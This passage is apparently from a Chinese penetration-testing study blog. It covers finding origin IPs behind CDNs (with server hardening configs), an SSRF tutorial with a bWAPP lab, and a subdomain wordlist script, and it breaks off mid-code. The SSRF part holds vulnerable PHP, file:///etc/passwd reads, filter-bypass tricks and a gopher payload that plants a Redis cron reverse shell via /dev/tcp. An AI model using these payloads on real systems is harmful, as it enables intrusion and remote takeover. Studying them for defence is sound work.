rel="noopener">fofa搜索</a>。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip，如图：</p><p> <img src="1058583-20181009231044976-1731199101%5B1%5D.png" alt=""></p><h5 id="4-利用SSL证书寻找真实原始IP"><a href="#4-利用SSL证书寻找真实原始IP" class="headerlink" title="4:利用SSL证书寻找真实原始IP"></a>4:利用SSL证书寻找真实原始IP</h5><p><strong>SSL证书</strong></p><p>​        SSL证书是<a href="https://baike.baidu.com/item/数字证书/326874" target="_blank" rel="noopener">数字证书</a>的一种，类似于驾驶证、护照和营业执照的电子副本。因为配置在服务器上，也称为SSL服务器证书。SSL 证书就是遵守 SSL协议，由受信任的数字证书颁发机构CA，在验证服务器身份后颁发，具有服务器身份验证和数据传输加密功能。</p><p>​        以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。</p><p>​        为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443<code>https://136.23.63.44:443</code>上直接连接到IP时，SSL证书就会被暴露。</p><p>​        此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。</p><p><a href="https://link.zhihu.com/?target=https%3A//censys.io/certificates/">https://censys.io/certificates/</a> 通过SSL证书查询真实IP（推荐）</p><p><strong>Censys证书查询搜索步骤如下：</strong></p><p>1、aaa.com 证书的搜索查询参数为：<code>parsed.names：aaa.com</code></p><p>只显示有效证书的查询参数为：<code>tags.raw：trusted</code></p><p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p><p>2、组合后的搜索参数为：<code>parsed.names: aaa.com and tags.raw: trusted</code></p><p>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的“<strong>Explore</strong>”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; <strong>IPv4 Hosts</strong>；</p><p>隐藏服务具有SSL证书，要查找它使用的IPv4，只需将”SHA1 fingerprint”（签名证书的sha1值，也就是SHA1指纹）粘贴到Censys平台IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器真实IP。</p><h5 id="方法5-利用HTTP标头寻找真实原始IP"><a href="#方法5-利用HTTP标头寻找真实原始IP" class="headerlink" title="方法5:利用HTTP标头寻找真实原始IP"></a>方法5:利用HTTP标头寻找真实原始IP</h5><p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p><p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p><p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p><p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下</p><p>80.http.get.headers.server:cloudflare</p><p><img src="1058583-20181009231212219-1764707602%5B1%5D.png" alt=""></p><h5 id="方法6-利用网站返回的内容寻找真实原始IP"><a href="#方法6-利用网站返回的内容寻找真实原始IP" class="headerlink" title="方法6:利用网站返回的内容寻找真实原始IP"></a>方法6:利用网站返回的内容寻找真实原始IP</h5><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p><p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p><p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ga（'create'，'UA-<span class="number">93577176</span>-1'，'auto'）;</span><br></pre></td></tr></table></figure><p>​        可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p><p><strong>Shodan</strong></p><p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p><h5 id="7-使用国外主机解析域名"><a href="#7-使用国外主机解析域名" class="headerlink" title="7:使用国外主机解析域名"></a>7:使用国外主机解析域名</h5><p>​        国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p><p>​       我这里通过国外主机nslookup查询国内163.com对应IP。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427095107.png" alt=""></p><p>我们可以看到只返回了一条对应IP，猜测应该是真实IP。</p><p>这里推荐一个国外的多节点ping工具。</p><p>域名：<a href="http://www.just-ping.com/" target="_blank" rel="noopener">http://www.just-ping.com/</a></p><h5 id="8-网站漏洞查找"><a href="#8-网站漏洞查找" class="headerlink" title="8:网站漏洞查找"></a>8:网站漏洞查找</h5><p>1.目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。</p><p> 2.XSS盲打，命令执行反弹shell，SSRF等。可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</p><p> 3.无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p><h5 id="9-网站邮件订阅查找"><a href="#9-网站邮件订阅查找" class="headerlink" title="9:网站邮件订阅查找"></a>9:网站邮件订阅查找</h5><p>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p><h4 id="如何防止CDN被绕过？"><a href="#如何防止CDN被绕过？" class="headerlink" title="如何防止CDN被绕过？"></a>如何防止CDN被绕过？</h4><p>通过中间件配置只允许域名访问，禁止ip访问。</p><p>这样处理的话，所有直接访问站点真实IP的请求将会被拒绝，任何用户只能通过域名访问站点，通过预先设定的网络链路，从DNS→CDN→waf防护→源站，所有的域名访问请求都必须经过WAF检测。</p><h5 id="Nginx参考配置："><a href="#Nginx参考配置：" class="headerlink" title="Nginx参考配置："></a>Nginx参考配置：</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#添加一个server,在原server里绑定域名</span></span><br><span class="line">server  &#123;</span><br><span class="line">        listen 80 default;</span><br><span class="line">        server_name _;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  www.demo.com;</span><br><span class="line">        <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</span><br></pre></td></tr></table></figure><h5 id="Apache参考配置"><a href="#Apache参考配置" class="headerlink" title="Apache参考配置:"></a>Apache参考配置:</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在httpd.conf最后面加上</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost 此处填写IP&gt;</span></span><br><span class="line">        <span class="attribute"><span class="nomarkup">ServerName</span></span> 此处填写IP</span><br><span class="line">        <span class="section">&lt;Location /&gt;</span></span><br><span class="line">            <span class="attribute"><span class="nomarkup">Order</span></span> Allow,Deny</span><br><span class="line">            <span class="attribute"><span class="nomarkup">Deny</span></span> from <span class="literal">all</span></span><br><span class="line">        <span class="section">&lt;/Location&gt;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost 此处填写IP&gt;</span></span><br><span class="line">        <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/www/html</span><br><span class="line">        <span class="attribute"><span class="nomarkup">ServerName</span></span>   此处填写域名</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://zhuanlan.zhihu.com/p/116026247" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/116026247</a></p><p><a href="https://zhuanlan.zhihu.com/p/107294740" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/107294740</a></p><p><a href="https://www.fujieace.com/penetration-test/cdn-find-ip.html" target="_blank" rel="noopener">https://www.fujieace.com/penetration-test/cdn-find-ip.html</a></p><p><a href="https://forum.90sec.com/t/topic/524" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/524</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;绕过CDN查找真实IP方法总结&quot;&gt;&lt;a href=&quot;#绕过CDN查找真实IP方法总结&quot; class=&quot;headerlink&quot; title=&quot;绕过CDN查找真实IP方法总结&quot;&gt;&lt;/a&gt;绕过CDN查找真实IP方法总结&lt;/h2&gt;&lt;h4 id=&quot;什么是CDN以及CDN加速
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="绕过CDN" scheme="https://shu1l.github.io/tags/%E7%BB%95%E8%BF%87CDN/"/>
    
  </entry>
  
  <entry>
    <title>我的SSRF漏洞学习</title>
    <link href="https://shu1l.github.io/2020/04/20/ssrf-lou-dong-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/20/ssrf-lou-dong-xue-xi/</id>
    <published>2020-04-20T06:42:33.000Z</published>
    <updated>2020-04-27T11:43:35.931Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SSRF漏洞部分"><a href="#SSRF漏洞部分" class="headerlink" title="SSRF漏洞部分"></a>SSRF漏洞部分</h3><h4 id="SSRF简述"><a href="#SSRF简述" class="headerlink" title="SSRF简述"></a>SSRF简述</h4><p><img src="20181227082125119.png" alt=""></p><p>​       SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><h5 id="漏洞形成原因"><a href="#漏洞形成原因" class="headerlink" title="漏洞形成原因"></a>漏洞形成原因</h5><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>例如：</p><p><code>www.xxx.com/a.php?image=http://www.abc.com/1.jpg</code></p><p>如果我们将<a href="http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></p><p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p><p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现这个请求是否合法，然后服务器以他的身份来访问其他服务器的资源。</p><p><strong>curl造成的SSRF</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$ch=curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$URL);</span><br><span class="line">curl_setopt($ch,CURLOPT_HEADER,<span class="number">0</span>);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url=$_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>file_get_contents造成的SSRF</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url=$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="SSRF常见出现位置"><a href="#SSRF常见出现位置" class="headerlink" title="SSRF常见出现位置"></a>SSRF常见出现位置</h5><ul><li>分享：通过URL地址分享网页内容</li><li>转码服务</li><li>在线翻译</li><li>图片加载与下载：通过URL地址加载或下载图片</li><li>图片、文章收藏功能</li><li>未公开API实现以及其他调用URL的功能</li></ul><h5 id="SSRF验证方法"><a href="#SSRF验证方法" class="headerlink" title="SSRF验证方法"></a>SSRF验证方法</h5><p>1.因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p><p>2.在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><h5 id="利用SSRF漏洞"><a href="#利用SSRF漏洞" class="headerlink" title="利用SSRF漏洞"></a>利用SSRF漏洞</h5><ol><li>让服务器去访问相应的网址</li><li>让服务器去访问自己所处内网的一些指纹文件来判断是否存在相应的CMS</li><li>可以使用file、dict、gopher、ftp协议进行请求访问相应的文件</li><li>攻击运行在内网或本地的应用程序（比如溢出）;</li><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</li></ol><p>SSRF中各个编程语言可以使用的协议如下图所示：</p><p><img src="12.png" alt=""></p><ul><li><p>file协议</p><p>​    查看文件：file:///etc/passwd</p></li><li><p>dict协议</p><p>​    探测端口：dict://127.0.0.1:80</p></li><li><p>gopher协议</p><p>​    Gopher协议可以做很多，特别是在SSRF漏洞中可以发挥很多重要的作用，利用此协议可以攻击内网的FTP、Telnet Redis Memcache 也可以进行GET POST请求 .</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> -v 'http://sec.com:8082/sec/ssrf.php?url=gopher<span class="number">%3</span>A<span class="number">%2</span>F<span class="number">%2</span>F127.0.0.1<span class="number">%3</span>A6379<span class="number">%2</span>F_<span class="number">%2</span>A3<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%241</span><span class="number">%250</span>d<span class="number">%250</span>a1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2456</span><span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%2</span>A<span class="number">%2</span>F1<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span>bash<span class="number">%20</span>-i<span class="number">%20</span><span class="number">%3</span>E<span class="number">%26</span><span class="number">%20</span><span class="number">%2</span>Fdev<span class="number">%2</span>Ftcp<span class="number">%2</span>F127.0.0.1<span class="number">%2</span>F2333<span class="number">%200</span><span class="number">%3</span>E<span class="number">%261</span><span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A4<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%246</span><span class="number">%250</span>d<span class="number">%250</span>aconfig<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>adir<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2416</span><span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>Fvar<span class="number">%2</span>Fspool<span class="number">%2</span>Fcron<span class="number">%2</span>F<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A4<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%246</span><span class="number">%250</span>d<span class="number">%250</span>aconfig<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2410</span><span class="number">%250</span>d<span class="number">%250</span>adbfilename<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>aroot<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>asave<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>aquit<span class="number">%250</span>d<span class="number">%250</span>a'</span><br></pre></td></tr></table></figure></li></ul><ol><li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包）</li><li>攻击内网应用程序（利用跨协议通信技术）</li><li>DOS攻击</li><li>判断内网主机是否存活：访问是否有端口开放</li></ol><h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><ul><li><p>@绕过：<code>http://xxx.com@10.10.10.10=10.10.10.10</code></p></li><li><p>利用特殊的域名</p></li><li><p>利用句号</p><p>127。0。0。1=&gt;127.0.0.1</p></li><li><p>利用协议</p></li><li><p>利用Enclosed </p></li><li><p>IP使用其他进制：127.0.0.1=2130706433</p></li><li><p>使用短地址：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ==<a href="https://dwz.lc/2fGYWaE" target="_blank" rel="noopener">https://dwz.lc/2fGYWaE</a></p></li></ul><h5 id=""><a href="#" class="headerlink" title=""></a><img src="QQ%E6%88%AA%E5%9B%BE20200212110340.png" alt=""></h5><h4 id="bWAPP靶场实战（SSRF"><a href="#bWAPP靶场实战（SSRF" class="headerlink" title="bWAPP靶场实战（SSRF)"></a>bWAPP靶场实战（SSRF)</h4><h5 id="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"><a href="#一、使用（RFI）远程文件包含进行端口扫描（内网探测）" class="headerlink" title="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"></a>一、使用（RFI）远程文件包含进行端口扫描（内网探测）</h5><p>我们进入bWAPP  SSRF部分。</p><img src="QQ截图20200128162933.png" style="zoom:50%;" /><p>我们点击黑体字Port scan得到了端口扫描的攻击脚本</p><img src="QQ截图20200128163234.png" style="zoom:50%;" /><p>我们退出SSRF模块 进入（RFI/LFI)模块，发现?language=lang_en.php此处可能存在文件包含漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128163521.png" alt=""></p><p>我们在VM中开启了虚拟机，得知IP为192.168.153.131</p><img src="QQ截图20200128164256.png" style="zoom:50%;" /><h5 id="二、使用XXE获取敏感文件中的内容"><a href="#二、使用XXE获取敏感文件中的内容" class="headerlink" title="二、使用XXE获取敏感文件中的内容"></a>二、使用XXE获取敏感文件中的内容</h5><p>我们先点击黑体字获取XXE攻击脚本。</p><img src="QQ截图20200128170206.png" style="zoom:67%;" /><p><img src="QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt=""></p><p> 然后使用Burp抓包后发送到Repeater模块，</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt=""></p><p> 第一次我们使用http协议读取robots.txt文件内容</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt=""></p><p>第二次我们使用php协议读取 xml页面中的内容</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt=""></p><p>第三次我们使用file协议读取本机的/etc/passwd的内容</p><img src="QQ截图20200128180043.png" style="zoom:67%;" /><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://xz.aliyun.com/t/7333" target="_blank" rel="noopener">https://xz.aliyun.com/t/7333</a></p><p><a href="https://damit5.com/2018/05/26/SSRF-漏洞学习" target="_blank" rel="noopener">https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0</a></p><p><a href="https://www.cnblogs.com/zhaijiahui/p/7828585.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/7828585.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;SSRF漏洞部分&quot;&gt;&lt;a href=&quot;#SSRF漏洞部分&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞部分&quot;&gt;&lt;/a&gt;SSRF漏洞部分&lt;/h3&gt;&lt;h4 id=&quot;SSRF简述&quot;&gt;&lt;a href=&quot;#SSRF简述&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="web漏洞学习" scheme="https://shu1l.github.io/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="SSRF漏洞" scheme="https://shu1l.github.io/tags/SSRF%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>python编写子域名爆破小工具</title>
    <link href="https://shu1l.github.io/2020/04/20/python-bian-xie-zi-yu-ming-bao-po-xiao-gong-ju/"/>
    <id>https://shu1l.github.io/2020/04/20/python-bian-xie-zi-yu-ming-bao-po-xiao-gong-ju/</id>
    <published>2020-04-20T04:42:19.000Z</published>
    <updated>2020-04-28T05:09:06.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python编写子域名爆破小工具"><a href="#python编写子域名爆破小工具" class="headerlink" title="python编写子域名爆破小工具"></a>python编写子域名爆破小工具</h2><h4 id="字典生成工具编写"><a href="#字典生成工具编写" class="headerlink" title="字典生成工具编写"></a>字典生成工具编写</h4><p>这里主要使用的python的exrex模块：</p><p>此处有详细介绍，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/asciimoo/</span>exrex</span><br></pre></td></tr></table></figure><p>这个模块的主要功能：</p><ul><li>生成所有匹配的字符串</li><li>生成随机匹配的字符串</li><li>计算匹配字符串的数量</li><li>简化正则表达式</li></ul><p>安装方法：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install</span> exrex</span><br></pre></td></tr></table></figure><p>我们主要使用该模块的generate()方法。</p><ul><li>generate(s,limit=20)</li><li>函数的作用：创建一个生成器，生成给定正则表达式的所有匹配字符串</li><li>参数s:正则表达式</li><li>limit：范围限制，要求limit的类型为整型数</li></ul><h5 id="简单的例子："><a href="#简单的例子：" class="headerlink" title="简单的例子："></a>简单的例子：</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import exrex</span><br><span class="line"></span><br><span class="line"><span class="attribute">web_dic</span>=<span class="string">'demo'</span></span><br><span class="line"><span class="attribute">dic_pass</span>=<span class="string">'admin'</span></span><br><span class="line">rule = <span class="string">'&#123;web_dic&#125;[!@#]&#123;dic_pass&#125;'</span></span><br><span class="line">s = rule.format(<span class="attribute">web_dic</span>=web_dic,dic_pass=dic_pass)</span><br><span class="line">dics = list(exrex.generate(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dics:</span><br><span class="line">    <span class="builtin-name">print</span> i</span><br></pre></td></tr></table></figure><h4 id="编写子域名爆破脚本"><a href="#编写子域名爆破脚本" class="headerlink" title="编写子域名爆破脚本"></a>编写子域名爆破脚本</h4><p>自己编写的理解脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> exrex  <span class="comment">#导入生成字典模块</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">host_replace</span><span class="params">(hosts)</span>:</span>         <span class="comment">#域名处理方法</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">in</span> hosts:</span><br><span class="line">        hosts = hosts.split(<span class="string">'://'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'/'</span> <span class="keyword">in</span> hosts: </span><br><span class="line">        hosts = hosts.replace(<span class="string">'/'</span>,<span class="string">''</span>)              </span><br><span class="line">    hosts = <span class="string">""</span>.join(hosts)</span><br><span class="line">    <span class="keyword">return</span> hosts</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dic_create</span><span class="params">(hosts)</span>:</span>        <span class="comment">#子域名字典生成方法</span></span><br><span class="line">    web_white = [<span class="string">'com'</span>, <span class="string">'cn'</span>, <span class="string">'gov'</span>, <span class="string">'edu'</span>, <span class="string">'org'</span>]</span><br><span class="line">    web_dics = hosts.split(<span class="string">'.'</span>)</span><br><span class="line">    <span class="keyword">for</span> web_dic <span class="keyword">in</span> web_dics:</span><br><span class="line">        <span class="keyword">if</span> web_dic <span class="keyword">not</span> <span class="keyword">in</span> web_white:</span><br><span class="line">            f_rule = open(<span class="string">'rule.ini'</span>, <span class="string">'r'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> f_rule:</span><br><span class="line">                dics = list(exrex.generate(web_dic+i.strip(<span class="string">'\r\n'</span>)))</span><br><span class="line">                <span class="keyword">for</span> dic <span class="keyword">in</span> dics:</span><br><span class="line">                    <span class="keyword">if</span> len(dic)&gt;<span class="number">3</span>:</span><br><span class="line">                        dic_out = open(<span class="string">'mypass.txt'</span>,<span class="string">'a+'</span>)</span><br><span class="line">                        dic_out.write(dic+<span class="string">'\r\n'</span>)</span><br><span class="line">                        dic_out.close()</span><br><span class="line">                        <span class="keyword">print</span> dic</span><br><span class="line">    f_rule.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>       <span class="comment">#主函数</span></span><br><span class="line">    hosts = raw_input(<span class="string">"Write Your Hosts :"</span>)</span><br><span class="line">    host =host_replace(hosts)</span><br><span class="line">    dic_create(host)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.jianshu.com/p/a481a341eaa4" target="_blank" rel="noopener">https://www.jianshu.com/p/a481a341eaa4</a></p><p>子域名爆破脚本进阶版：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 